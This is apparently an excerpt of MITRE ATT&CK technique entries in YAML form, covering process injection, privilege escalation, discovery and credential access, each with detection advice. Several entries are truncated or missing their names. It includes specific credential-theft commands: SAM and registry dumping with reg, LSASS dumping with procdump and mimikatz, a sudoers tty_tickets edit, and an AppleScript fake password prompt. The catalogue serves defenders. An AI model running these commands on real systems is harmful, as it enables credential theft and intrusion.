        *'''VDSO hijacking''' performs runtime injection on ELF binaries by manipulating code stubs mapped in from the linux-vdso.so shared object. (Citation: VDSO hijack 2009)

        Malware commonly utilizes process injection to access system resources through which Persistence and other environment modifications can be made. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.

        Detection: Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, QueueUserAPC, and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique. (Citation: Engame Process Injection July 2017)

        Monitoring for Linux specific calls such as the ptrace system call, the use of LD_PRELOAD environment variable, or dlfcn dynamic linking API calls, should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.  (Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits)

        Monitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules. (Citation: Microsoft Sysmon v6 May 2017)

        Monitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using PowerShell with tools such as PowerSploit, (Citation: Powersploit) so additional PowerShell monitoring may be required to cover known implementations of this behavior.

      name: Scheduled Task
      description: |-
        Utilities such as at and schtasks, along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the the remote system. (Citation: TechNet Task Scheduler Security)

        An adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.

        Detection: Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\System32\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

        Configure event logging for scheduled task creation and changes by enabling the "Microsoft-Windows-TaskScheduler/Operational" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)

        *Event ID 106 - Scheduled task registered
        *Event ID 140 - Scheduled task updated
        *Event ID 141 - Scheduled task removed

        Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns) Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.

        Monitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.

      name: Setuid and Setgid
      description: |-
        When the setuid or setgid bits are set on Linux or macOS for an application, this means that the application will run with the privileges of the owning user or group respectively. Normally an application is run in the current user’s context, regardless of which user or group owns the application. There are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges. Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an "s" instead of an "x" when viewing a file's attributes via <code>ls -l</code>. The <code>chmod</code> program can set these bits with via bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>.

        An adversary can take advantage of this to either do a shell escape or exploit a vulnerability in an application with the setsuid or setgid bits to get code running in a different user’s context.

        Detection: Monitor the file system for files that have the setuid or setgid bits set. Monitor for execution of utilities, like chmod, and their command-line arguments to look for setuid or setguid bits being set.

      name: Sudo Caching
      description: "The <code>sudo</code> command \"allows a system administrator
        to delegate authority to give certain users (or groups of users) the ability
        to run some (or all) commands as root or another user while providing an audit
        trail of the commands and their arguments\"  (Citation: sudo man page 2018).
        Since sudo was made for the system administrator, it has some useful configuration
        features such as a <code>timestamp_timeout</code> that is the amount of time
        in minutes between instances of <code>sudo</code> before it will re-prompt
        for a password. This is because <code>sudo</code> has the ability to cache
        credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code>
        with a timestamp of when sudo was last run to determine this timeout. Additionally,
        there is a <code>tty_tickets</code> variable that treats each new tty (terminal
        session) in isolation. This means that, for example, the sudo timeout of one
        tty will not affect another tty (you will have to type the password again).\n\nAdversaries
        can abuse poor configurations of this to escalate privileges without needing
        the user's password. <code>/var/db/sudo</code>'s timestamp can be monitored
        to see if it falls within the <code>timestamp_timeout</code> range. If it
        does, then malware can execute sudo commands without needing to supply the
        user's password. Combined with <code>tty_tickets</code> being disabled, means
        adversaries can do this from any tty for that user. \n\nThe OSX Proton Malware
        has disabled <code>tty_tickets</code> to potentially make scripting easier
        by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>  (Citation:
        cybereason osx proton). In order for this change to be reflected, the Proton
        malware also must issue <code>killall Terminal</code>. As of macOS Sierra,
        the sudoers file has <code>tty_tickets</code> enabled by default.\n\nDetection:
        This technique is abusing normal functionality in macOS and Linux systems,
        but sudo has the ability to log all input and output based on the <code>LOG_INPUT</code>
        and <code>LOG_OUTPUT</code> directives in the <code>/etc/sudoers</code> file.\n\nPlatforms:

      name: Account Discovery
      description: "Adversaries may attempt to get a listing of local system or domain
        accounts. \n\n===Windows===\n\nExample commands that can acquire this information
        are <code>net user</code>, <code>net group <groupname></code>, and <code>net
        localgroup <groupname></code> using the Net utility or through use of dsquery.
        If adversaries attempt to identify the primary user, currently logged in user,
        or set of users that commonly uses a system, System Owner/User Discovery may
        apply.\n\n===Mac===\n\nOn Mac, groups can be enumerated through the <code>groups</code>
        and <code>id</code> commands. In mac specifically, <code>dscl . list /Groups</code>
        and <code>dscacheutil -q group</code> can also be used to enumerate groups
        and users.\n\n===Linux===\n\nOn Linux, local users can be enumerated through
        the use of the <code>/etc/passwd</code> file which is world readable. In mac,
        this same file is only used in single-user mode in addition to the <code>/etc/master.passwd</code>
        file.\n\nAlso, groups can be enumerated through the <code>groups</code> and
        <code>id</code> commands. In mac specifically, <code>dscl . list /Groups</code>
        and <code>dscacheutil -q group</code> can also be used to enumerate groups
        and users.\n\nDetection: System and network discovery techniques normally
        occur throughout an operation as an adversary learns the environment. Data
        and events should not be viewed in isolation, but as part of a chain of behavior
        that could lead to other activities, such as Lateral Movement, based on the
        information obtained.\n\nMonitor processes and command-line arguments for
        actions that could be taken to gather system and network information. Remote
        access tools with built-in features may interact directly with the Windows

      name: Browser Bookmark Discovery
      description: |-
        Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.

        Browser bookmarks may also highlight additional targets after an adversary has access to valid credentials, especially Credentials in Files associated with logins cached by a browser.

        Specific storage locations vary based on platform and/or application, but browser bookmarks are typically stored in local files/databases.

        Detection: Monitor processes and command-line arguments for actions that could be taken to gather browser bookmark information. Remote access tools with built-in features may interact directly using APIs to gather information. Information may also be acquired through system management tools such as Windows Management Instrumentation and PowerShell.

        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.

      description: |-
        Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system.

        Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

        Normal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.

      name: Password Policy Discovery
      description: |-
        Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through Brute Force. An adversary may attempt to access detailed information about the password policy used within an enterprise network. This would help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).

        Password policies can be set and discovered on Windows, Linux, and macOS systems. (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies)

        ===Windows===
        * <code>net accounts</code>
        * <code>net accounts /domain</code>

        ===Linux===
        * <code>chage -l <username></code>
        * <code>cat /etc/pam.d/common-password</code>

        ===macOS===
        * <code>pwpolicy getaccountpolicies</code>

        Detection: Monitor processes for tools and command line arguments that may indicate they're being used for password policy discovery. Correlate that activity with other suspicious activity from the originating system to reduce potential false positives from valid user or administrator activity. Adversaries will likely attempt to find the password policy early in an operation and the activity is likely to happen with other Discovery activity.

        Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are "sc," "tasklist /svc" using Tasklist, and "net start" using Net, but adversaries may also use other tools as well.

        Detection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

        The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. (Citation: MSDN System Time) (Citation: Technet Windows Time Service)

        An adversary may gather the system time and/or time zone from a local or remote system. This information may be gathered in a number of ways, such as with Net on Windows by performing <code>net time \\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>. (Citation: Technet Windows Time Service) The information could be useful for performing other techniques, such as executing a file with a Scheduled Task (Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting.

        Detection: Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.

      description: |-
        Account manipulation may aid adversaries in maintaining access to credentials and certain permission levels within an environment. Manipulation could consist of modifying permissions, modifying credentials, adding or changing permission groups, modifying account settings, or modifying how authentication is performed. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.

        Detection: Collect events that correlate with changes to account objects on systems and the domain, such as event ID 4738. (Citation: Microsoft User Modified Event) Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems. Especially flag events where the subject and target accounts differ (Citation: InsiderThreat ChangeNTLM July 2017) or that include additional flags such as changing a password without knowledge of the old password. (Citation: GitHub Mimikatz Issue 92 June 2017)

        Use of credentials may also occur at unusual times or to unusual systems or services and may correlate with other suspicious activity.

      name: Bash History
      description: |-
        Bash keeps track of the commands users type on the command-line with the "history" utility. Once a user logs out, the history is flushed to the user’s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Attackers can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)

        Detection: Monitoring when the user's <code>.bash_history</code> is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like "history" instead of commands like <code>cat ~/.bash_history</code>.

        Dumping to obtain password hashes may only get an adversary so far when Pass
        the Hash is not an option. Techniques to systematically guess the passwords
        used to compute hashes are available, or the adversary may use a pre-computed
        rainbow table. Cracking hashes is usually done on adversary-controlled systems
        outside of the target network. (Citation: Wikipedia Password cracking)\n\nAdversaries
        may attempt to brute force logins without knowledge of passwords or hashes
        during an operation either with zero knowledge or by attempting a list of
        known or possible passwords. This is a riskier option because it could cause
        numerous authentication failures and account lockouts, depending on the organization's
        login failure policies. (Citation: Cylance Cleaver)\n\nA related technique
        called password spraying uses one password, or a small list of passwords,
        that matches the complexity policy of the domain and may be a commonly used
        password. Logins are attempted with that password and many different accounts
        on a network to avoid account lockouts that would normally occur when brute
        forcing a single account with many passwords. (Citation: BlackHillsInfosec
        Password Spraying)\n\nDetection: It is difficult to detect when hashes are
        cracked, since this is generally done outside the scope of the target network.
        \n\nMonitor authentication logs for system and application login failures
        of Valid Accounts. If authentication failures are high, then there may be
        a brute force attempt to gain access to a system using legitimate credentials.\n\nAlso

      description: "Credential dumping is the process of obtaining account login and
        password information, normally in the form of a hash or a clear text password,
        from the operating system and software. Credentials can then be used to perform Lateral
        Movement and access restricted information.\n\nSeveral of the tools mentioned
        in this technique may be used by both adversaries and professional security
        testers. Additional custom tools likely exist as well.\n\n===SAM (Security
        Accounts Manager)===\n\nThe SAM is a database file that contains local accounts
        for the host, typically those found with the ‘net user’ command.  To enumerate
        the SAM database, system level access is required.\n \nA number of tools can
        be used to retrieve the SAM file through in-memory techniques:\n* pwdumpx.exe
        \n* gsecdump\n* Mimikatz\n* secretsdump.py\n\nAlternatively, the SAM can be
        extracted from the Registry with Reg:\n* <code>reg save HKLM\\sam sam</code>\n*
        <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to
        process the SAM database locally to retrieve hashes. (Citation: GitHub Creddump7)\n\nNotes:\nRid
        500 account is the local, in-built administrator.\nRid 501 is the guest account.\nUser
        accounts start with a RID of 1,000+.\n\n===Cached Credentials===\n\nThe DCC2
        (Domain Cached Credentials version 2) hash, used by Windows Vista and newer
        caches credentials when the domain controller is unavailable.  The number
        of default cached credentials varies, and this number can be altered per system.
        \ This hash does not allow pass-the-hash style attacks.\n \nA number of tools
        can be used to retrieve the SAM file through in-memory techniques.\n* pwdumpx.exe
        \n* gsecdump\n* Mimikatz\n\nAlternatively, reg.exe can be used to extract
        from the Registry and Creddump7 used to gather the credentials.\n\nNotes:\nCached
        credentials for Windows Vista are derived using PBKDF2.\n\n===Local Security
        Authority (LSA) Secrets===\n\nWith SYSTEM access to a host, the LSA secrets
        often allows trivial access from a local account to domain-based account credentials.
        The Registry is used to store the LSA secrets.\n \nWhen services are run under
        the context of local or domain users, their passwords are stored in the Registry.
        If auto-logon is enabled, this information will be stored in the Registry
        as well.\n \nA number of tools can be used to retrieve the SAM file through
        in-memory techniques.\n* pwdumpx.exe \n* gsecdump\n* Mimikatz\n* secretsdump.py\n\nAlternatively,
        reg.exe can be used to extract from the Registry and Creddump7 used to gather
        the credentials.\n\nNotes:\nThe passwords extracted by his mechanism are UTF-16 encoded,
        which means that they are returned in plaintext.\nWindows 10 adds protections
        for LSA Secrets described in Mitigation.\n\n===NTDS from Domain Controller===\n\nActive
        Directory stores information about members of the domain including devices
        and users to verify credentials and define access rights. The Active Directory
        domain database is stored in the NTDS.dit file. By default the NTDS file will
        be located in %SystemRoot%\\NTDS\\Ntds.dit of a domain controller. (Citation:
        Wikipedia Active Directory)\n \nThe following tools and techniques can be
        used to enumerate the NTDS file and the contents of the entire Active Directory
        hashes.\n \n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows
        tool, ntdsutil.exe\n* Invoke-NinjaCopy\n\n===Group Policy Preference (GPP)
        Files===\n\nGroup Policy Preferences (GPP) are tools that allowed administrators
        to create domain policies with embedded credentials. These policies, amongst
        other things, allow administrators to set local accounts.\n \nThese group
        policies are stored in SYSVOL on a domain controller, this means that any
        domain user can view the SYSVOL share and decrypt the password (the AES private
        key was leaked on-line. (Citation: Microsoft GPP Key) (Citation: SRD GPP)\n \nThe
        following tools and scripts can be used to gather and decrypt the password
        file from Group Policy Preference XML files:\n \n* Metasploit’s post exploitation
        module: \"post/windows/gather/credentials/gpp\"\n* Get-GPPPassword (Citation:
        Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n \nNotes:\nOn the SYSVOL
        share, the following can be used to enumerate potential XML files.\ndir /s
        *.xml\n\n===Service Principle Names (SPNs)===\n\nSee Kerberoasting.\n\n===Plaintext
        Credentials===\n\nAfter a user logs on to a system, a variety of credentials
        are generated and stored in the Local Security Authority Subsystem Service (LSASS)
        process in memory. These credentials can be harvested by a administrative
        user or SYSTEM.\n \nSSPI (Security Support Provider Interface) functions as
        a common interface to several Security Support Providers (SSPs): A Security
        Support Provider is a dynamic-link library (DLL) that makes one or more security
        packages available to applications.\n\nThe following SSPs can be used to access
        credentials:\n \nMsv: Interactive logons, batch logons, and service logons
        are done through the MSV authentication package.\nWdigest: The Digest Authentication
        protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple
        Authentication Security Layer (SASL) exchanges. (Citation: TechNet Blogs Credential
        Protection)\nKerberos: Preferred for mutual client-server domain authentication
        in Windows 2000 and later.\nCredSSP:  Provides SSO and Network Level Authentication for Remote
        Desktop Services. (Citation: Microsoft CredSSP)\n \nThe following tools can
        be used to enumerate credentials:\n \n* Windows Credential Editor\n* Mimikatz\n \nAs
        well as in-memory techniques, the LSASS process memory can be dumped from
        the target host and analyzed on a local system.\n \nFor example, on the target
        host use procdump:\n* <code>procdump -ma lsass.exe lsass_dump</code>\n \nLocally,
        mimikatz can be run:\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\n===DCSync===
        \n\nDCSync is a variation on credential dumping which can be used to acquire
        sensitive information from a domain controller. Rather than executing recognizable
        malicious code, the action works by abusing the domain controller's  application
        programming interface (API) (Citation: Microsoft DRSR Dec 2017) (Citation:
        Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll)
        to simulate the replication process from a remote domain controller.  Any
        members of the Administrators, Domain Admins, Enterprise Admin groups or computer
        accounts on the domain controller are able to run DCSync to pull password
        data  (Citation: ADSecurity Mimikatz DCSync) from Active Directory, which
        may include current and historical hashes of potentially useful accounts such
        as KRBTGT and Administrators. The hashes can then in turn be used to create
        a Golden Ticket for use in Pass the Ticket (Citation: Harmj0y Mimikatz and
        DCSync) or change an account's password as noted in Account Manipulation.
        (Citation: InsiderThreat ChangeNTLM July 2017) DCSync functionality has been
        included in the \"lsadump\" module in Mimikatz. (Citation: GitHub Mimikatz
        lsadump Module) Lsadump also includes NetSync, which performs DCSync over
        a legacy replication protocol. (Citation: Microsoft NRPC Dec 2017)\n\nDetection:
        Common credential dumpers such as Mimikatz access the LSA Subsystem Service
        (LSASS) process by opening the process, locating the LSA secrets key, and
        decrypting the sections in memory where credential details are stored. Credential
        dumpers may also use methods for reflective Process Injection to reduce potential
        indicators of malicious activity.\n\nHash dumpers open the Security Accounts
        Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM)
        or create a dump of the Registry SAM key to access stored account password
        hashes. Some hash dumpers will open the local file system as a device and
        parse to the SAM table to avoid file access defenses. Others will make an
        in-memory copy of the SAM table before reading hashes. Detection of compromised
        Valid Accounts in-use by adversaries may help as well. \n\nOn Windows 8.1
        and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to
        verify that LSASS started as a protected process.\n\nMonitor processes and
        command-line arguments for program execution that may be indicative of credential
        dumping. Remote access tools may contain built-in features or incorporate
        existing tools like Mimikatz. PowerShell scripts also exist that contain credential
        dumping functionality, such as PowerSploit's Invoke-Mimikatz module, (Citation:
        Powersploit) which may require additional logging features to be configured
        in the operating system to collect necessary information for analysis.\n\nMonitor
        domain controller logs for replication requests and other unscheduled activity
        possibly associated with DCSync. (Citation: Microsoft DRSR Dec 2017) (Citation:
        Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Note: Domain controllers
        may not log replication requests originating from the default domain controller
        account. (Citation: Harmj0y DCSync Sept 2015). Also monitor for network protocols
        \ (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017)
        and other replication requests (Citation: Microsoft SAMR) from IPs not associated
        with known domain controllers. (Citation: AdSecurity DCSync Sept 2015)\n\nPlatforms:

These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

        It is possible to extract passwords from backups or saved virtual machines through Credential Dumping. (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)

        Detection: While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See Valid Accounts for more information.

      name: Credentials in Registry
      description: |-
        The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.

        Example commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)
        *Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>
        *Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>

        Detection: Monitor processes for applications that can be used to query the Registry, such as Reg, and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives.

        Platforms: Windows

        Data Sources: Windows Registry, Process command-line parameters, Process Monitoring

        Permissions Required: User, Administrator

        System Requirements: Ability to query some Registry locations depends on the adversary's level of access. User permissions are usually limited to access of user-related Registry keys.

      name: Two-Factor Authentication Interception
      description: |-
        Use of two- or multifactor authentication is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. Adversaries may target authentication mechanisms, such as smart cards, to gain access to systems, services, and network resources.

        If a smart card is used for two-factor authentication (2FA), then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)

        Other methods of 2FA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors. (Citation: Operation Emmental)

        Other hardware tokens, such as RSA SecurID, require the adversary to have access to the physical device or the seed and algorithm in addition to the corresponding credentials.

        Detection: Detecting use of proxied smart card connections by an adversary may be difficult because it requires the token to be inserted into a system; thus it is more likely to be in use by a legitimate user and blend in with other network behavior.

        Platforms: Linux, macOS, Windows

        Permissions Required: Administrator, SYSTEM

        System Requirements: Smart card Proxy: Use of smart cards for single or multifactor authentication to access to network resources. Attached smart card reader with card inserted.

        Out-of-band one-time code: Access to the device, service, or communications to intercept the one-time code.

        Hardware token: Access to the seed and algorithm of generating one-time codes.

    technique:
      name: Hooking
      description: |-
        Windows processes often leverage application programming interface (API) functions to perform tasks that require reusable system resources. Windows API functions are typically stored in dynamic-link libraries (DLLs) as exported functions. Hooking involves redirecting calls to these functions and can be implemented via:
        * '''Hooks procedures''', which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs. (Citation: Microsoft Hook Overview) (Citation: Engame Process Injection July 2017)
        * '''Import address table (IAT) hooking''', which use modifications to a process’s IAT, where pointers to imported API functions are stored. (Citation: Engame Process Injection July 2017) (Citation: Adlice Software IAT Hooks Oct 2014) (Citation: MWRInfoSecurity Dynamic Hooking 2015)
        * '''Inline hooking''', which overwrites the first bytes in an API function to redirect code flow. (Citation: Engame Process Injection July 2017) (Citation: HighTech Bridge Inline Hooking Sept 2011) (Citation: MWRInfoSecurity Dynamic Hooking 2015)

        Similar to Process Injection, adversaries may use hooking to load and execute malicious code within the context of another process, masking the execution while also allowing access to the process's memory and possibly elevated privileges. Installing hooking mechanisms may also provide Persistence via continuous invocation when the functions are called through normal use.

        Malicious hooking mechanisms may also capture API calls that include parameters that reveal user authentication credentials for Credential Access. (Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017)

        Hooking is commonly utilized by Rootkits to conceal files,
        processes, Registry keys, and other objects in order to hide malware and associated behaviors. (Citation: Symantec Windows Rootkits)

        Detection: Monitor for calls to the SetWindowsHookEx and SetWinEventHook functions, which install a hook procedure. (Citation: Microsoft Hook Overview) (Citation: Volatility Detecting Hooks Sept 2012) Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools  (Citation: Volatility Detecting Hooks Sept 2012) (Citation: PreKageo Winhook Jul 2011) (Citation: Jay GetHooks Sept 2011) or by programmatically examining internal kernel structures. (Citation: Zairon Hooking Dec 2006) (Citation: EyeofRa Detecting Hooking June 2017)

        Rootkits detectors  (Citation: GMER Rootkits) can also be used to monitor for various flavors of hooking activity.

        Verify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes  (Citation: Microsoft Process Snapshot) to compare the in-memory IAT to the real addresses of the referenced functions. (Citation: StackExchange Hooks Jul 2012) (Citation: Adlice Software IAT Hooks Oct 2014)

        Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.

      name: Input Capture
      description: |-
        Adversaries can use methods of capturing user input for obtaining credentials for Valid Accounts and information Collection that include keylogging and user input field interception.

        Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes, (Citation: Adventures of a Keystroke) but other methods exist to target information for specific purposes, such as performing a UAC prompt or wrapping the Windows default credential provider. (Citation: Wrightson 2012)

        Keylogging is likely to be used to acquire credentials for new access opportunities when Credential Dumping efforts are not effective, and may require an adversary to remain passive on a system for a period of time before an opportunity arises.

        Adversaries may also install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through External Remote Services and Valid Accounts or as part of the initial compromise by exploitation of the externally facing web service. (Citation: Volexity Virtual Private Keylogging)

        Detection: Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.

API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.

      description: |-
        When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task. Adversaries can mimic this functionality to prompt users for credentials with a normal-looking prompt. This type of prompt can be accomplished with AppleScript:

        <code>set thePassword to the text returned of (display dialog "AdobeUpdater needs permission to check for updates. Please authenticate." default answer "")</code>
         (Citation: OSX Keydnap malware)

        Adversaries can prompt a user for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite. (Citation: OSX Malware Exploits MacKeeper)

        Detection: This technique exploits users' tendencies to always supply credentials when prompted, which makes it very difficult to detect. Monitor process execution for unusual programs as well as AppleScript that could be used to prompt users for credentials.

      description: |-
        Keychains are the built-in way for macOS to keep track of users' passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in <code>~/Library/Keychains/</code>,<code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>. (Citation: Wikipedia keychain) The <code>security</code> command-line utility, which is built into macOS by default, provides a useful way to manage these credentials.

        To manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault. (Citation: External to DA, the OS X Way) By default, the passphrase for the keychain is the user’s logon credentials.

        Detection: Unlocking the keychain and using passwords from it is a very common process, so there is likely to be a lot of noise in any detection technique. Monitoring of system calls to the keychain can help determine if there is a suspicious process trying to access it.

      name: Network Sniffing
      description: |-
        Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection.

        User credentials may be sent over an insecure, unencrypted protocol that can be captured and obtained through network packet analysis. An adversary may place a network interface into promiscuous mode, using a utility to capture traffic in transit over the network or use span ports to capture a larger amount of data. In addition, techniques for name service resolution poisoning, such as LLMNR/NBT-NS Poisoning, can be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.

        Detection: Detecting the events leading up to sniffing network traffic may be the best method of detection. From the host level, an adversary would likely need to perform a man-in-the-middle attack against other devices on a wired network in order to capture traffic that was not to or from the current compromised system. This change in the flow of information is detectable at the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts. Detecting compromised network devices is a bit more challenging. Auditing administrator logins, configuration changes, and device images is required to detect malicious changes.

        Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. (Citation: Wikipedia Public Key Crypto)

        Adversaries may gather private keys from compromised systems for use in authenticating to Remote Services like SSH or for use in decrypting other collected files such as email. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on *nix-based systems or <code>C:\Users\(username)\.ssh\</code> on Windows.

        Private keys should require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line.

        Adversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates. (Citation: Kaspersky Careto) (Citation: Palo Alto Prince of Persia)

        Detection: Monitor access to files and directories related to cryptographic keys and certificates as a means for potentially detecting access patterns that may indicate collection and exfiltration activity. Collect authentication logs and look for potentially abnormal activity that may indicate improper use of keys or certificates for remote authentication.

        for interprocess communications (IPC). These messages can be easily scripted
